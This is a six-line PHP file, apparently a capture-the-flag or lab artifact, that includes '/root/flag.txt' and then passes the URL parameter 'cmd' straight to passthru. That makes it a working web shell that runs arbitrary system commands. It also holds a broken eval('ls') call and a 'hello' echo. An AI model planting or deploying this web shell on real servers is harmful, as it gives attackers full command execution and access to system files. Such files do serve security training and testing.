<?php
include '/root/flag.txt';
passthru($_GET['cmd']);
eval("ls");
echo 'hello';
?>
